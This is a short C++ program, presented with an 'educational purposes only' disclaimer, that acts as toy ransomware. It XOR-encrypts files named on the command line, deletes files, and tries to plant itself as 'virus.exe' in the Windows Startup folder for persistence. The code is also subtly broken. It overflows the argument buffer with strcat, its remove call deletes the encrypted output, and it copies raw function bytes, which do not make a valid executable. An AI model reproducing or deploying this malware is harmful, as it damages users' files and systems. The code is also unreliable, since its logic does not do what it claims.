#include <iostream>
#include <fstream>
#include <cstdlib>
#include <cstring>

using namespace std;

/*
0x1975

This code is for educational purposes only. It is not intended to be used for any malicious or harmful purposes. 
The author of this code is not responsible for any damage or harm caused by the use of this code. 
Please use this code responsibly and only for educational purposes. 
*/


void encrypt(char *fileName)
{
    ifstream input;
    ofstream output;
    input.open(fileName, ios::binary);
    output.open(strcat(fileName, ".enc"), ios::binary);

    char key = 'K';
    char byte;
    while (input >> noskipws >> byte)
    {
        byte = byte ^ key;
        output << byte;
    }
    input.close();
    output.close();
    remove(fileName);
}

int main(int argc, char *argv[])
{
    if (argc != 1)
    {
        for (int i = 1; i < argc; i++)
        {
            encrypt(argv[i]);
        }
    }
    else
    {
        char *appdata = getenv("APPDATA");
        char path[255];
        strcpy(path, appdata);
        strcat(path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\virus.exe");
        ofstream output(path, ios::binary);
        output.write((char *) &main, (char *) &encrypt - (char *) &main);
        output.close();
    }
    return 0;
}
